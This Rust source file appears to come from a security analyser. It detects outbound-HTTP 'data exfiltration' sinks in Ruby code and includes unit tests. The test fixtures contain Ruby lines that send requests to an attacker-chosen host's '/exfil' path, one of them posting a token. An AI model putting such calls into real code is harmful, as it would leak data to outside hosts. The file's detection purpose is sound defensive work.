//! Ruby [`super::super::FrameworkAdapter`] matching outbound-HTTP
//! sink constructions (`Net::HTTP.{get,get_response,post_form,start}`,
//! `RestClient.{get,post}`, `HTTParty.{get,post}`, `Faraday.get`,
//! `open-uri`'s `open(...)`).
//!
//! Phase 11 (Track L.9).  Fires when the function body invokes one
//! of the canonical Ruby HTTP-client entry points and the
//! surrounding source requires the matching client module.

use crate::dynamic::framework::{FrameworkAdapter, FrameworkBinding};
use crate::evidence::EntryKind;
use crate::summary::FuncSummary;
use crate::symbol::Lang;

pub struct DataExfilRubyAdapter;

const ADAPTER_NAME: &str = "data-exfil-ruby";

fn callee_is_outbound_http(name: &str) -> bool {
    let last = name.rsplit_once("::").map(|(_, s)| s).unwrap_or(name);
    let last = last.rsplit_once('.').map(|(_, s)| s).unwrap_or(last);
    matches!(last, "get_response" | "post_form" | "request" | "start")
        || matches!(
            name,
            "Net::HTTP.get"
                | "Net::HTTP.get_response"
                | "Net::HTTP.post_form"
                | "Net::HTTP.start"
                | "Net::HTTP::Get.new"
                | "Net::HTTP::Post.new"
                | "RestClient.get"
                | "RestClient.post"
                | "RestClient.put"
                | "RestClient.delete"
                | "RestClient::Request.execute"
                | "HTTParty.get"
                | "HTTParty.post"
                | "HTTParty.put"
                | "HTTParty.delete"
                | "Faraday.get"
                | "Faraday.post"
                | "Faraday.new"
                | "Faraday::Connection.get"
                | "URI.open"
                | "Kernel.open"
        )
}

fn source_imports_ruby_http_client(file_bytes: &[u8]) -> bool {
    const NEEDLES: &[&[u8]] = &[
        b"require 'net/http'",
        b"require \"net/http\"",
        b"require 'open-uri'",
        b"require \"open-uri\"",
        b"require 'rest-client'",
        b"require \"rest-client\"",
        b"require 'rest_client'",
        b"require 'httparty'",
        b"require \"httparty\"",
        b"require 'faraday'",
        b"require \"faraday\"",
        b"require 'http'",
        b"require \"http\"",
        b"Net::HTTP",
        b"RestClient.",
        b"HTTParty.",
        b"Faraday.",
    ];
    NEEDLES
        .iter()
        .any(|n| file_bytes.windows(n.len()).any(|w| w == *n))
}

/// Returns `true` when the surrounding source visibly routes the
/// outbound URL through a host-allowlist / network-policy gate.
fn host_routed_through_allowlist(file_bytes: &[u8]) -> bool {
    const NEEDLES: &[&[u8]] = &[
        b"ALLOWLIST",
        b"allowlist",
        b"ALLOWED_HOSTS",
        b"allowed_hosts",
        b"'127.0.0.1'",
        b"\"127.0.0.1\"",
        b"'localhost'",
        b"\"localhost\"",
        b"host == 'localhost'",
        b"host == \"localhost\"",
    ];
    NEEDLES
        .iter()
        .any(|n| file_bytes.windows(n.len()).any(|w| w == *n))
}

impl FrameworkAdapter for DataExfilRubyAdapter {
    fn name(&self) -> &'static str {
        ADAPTER_NAME
    }

    fn lang(&self) -> Lang {
        Lang::Ruby
    }

    fn detect(
        &self,
        summary: &FuncSummary,
        _ast: tree_sitter::Node<'_>,
        file_bytes: &[u8],
    ) -> Option<FrameworkBinding> {
        if host_routed_through_allowlist(file_bytes) {
            return None;
        }
        let matches_call = super::any_callee_matches(summary, callee_is_outbound_http);
        let matches_source = source_imports_ruby_http_client(file_bytes);
        if matches_call && matches_source {
            Some(FrameworkBinding {
                adapter: ADAPTER_NAME.to_owned(),
                kind: EntryKind::Function,
                route: None,
                request_params: Vec::new(),
                response_writer: None,
                middleware: Vec::new(),
            })
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse_ruby(src: &[u8]) -> tree_sitter::Tree {
        let mut parser = tree_sitter::Parser::new();
        let lang = tree_sitter::Language::from(tree_sitter_ruby::LANGUAGE);
        parser.set_language(&lang).unwrap();
        parser.parse(src, None).unwrap()
    }

    #[test]
    fn fires_on_net_http_get() {
        let src: &[u8] = b"require 'net/http'\n\
            def run(host)\n  Net::HTTP.get(URI(\"http://#{host}/exfil\"))\nend\n";
        let tree = parse_ruby(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("Net::HTTP.get")],
            ..Default::default()
        };
        assert!(
            DataExfilRubyAdapter
                .detect(&summary, tree.root_node(), src)
                .is_some()
        );
    }

    #[test]
    fn fires_on_restclient_post() {
        let src: &[u8] = b"require 'rest-client'\n\
            def run(host)\n  RestClient.post(\"http://#{host}/exfil\", { token: 'x' })\nend\n";
        let tree = parse_ruby(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("RestClient.post")],
            ..Default::default()
        };
        assert!(
            DataExfilRubyAdapter
                .detect(&summary, tree.root_node(), src)
                .is_some()
        );
    }

    #[test]
    fn fires_on_faraday_get() {
        let src: &[u8] = b"require 'faraday'\n\
            def run(host)\n  Faraday.get(\"http://#{host}/exfil\")\nend\n";
        let tree = parse_ruby(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("Faraday.get")],
            ..Default::default()
        };
        assert!(
            DataExfilRubyAdapter
                .detect(&summary, tree.root_node(), src)
                .is_some()
        );
    }

    #[test]
    fn skips_when_host_routed_through_allowlist() {
        let src: &[u8] = b"require 'net/http'\n\
            ALLOWLIST = ['127.0.0.1', 'localhost'].freeze\n\
            def run(host)\n  return unless ALLOWLIST.include?(host)\n  Net::HTTP.get(URI(\"http://#{host}/exfil\"))\nend\n";
        let tree = parse_ruby(src);
        let summary = FuncSummary {
            name: "run".into(),
            callees: vec![crate::summary::CalleeSite::bare("Net::HTTP.get")],
            ..Default::default()
        };
        assert!(
            DataExfilRubyAdapter
                .detect(&summary, tree.root_node(), src)
                .is_none()
        );
    }

    #[test]
    fn skips_plain_function() {
        let src: &[u8] = b"def add(a, b)\n  a + b\nend\n";
        let tree = parse_ruby(src);
        let summary = FuncSummary {
            name: "add".into(),
            ..Default::default()
        };
        assert!(
            DataExfilRubyAdapter
                .detect(&summary, tree.root_node(), src)
                .is_none()
        );
    }
}
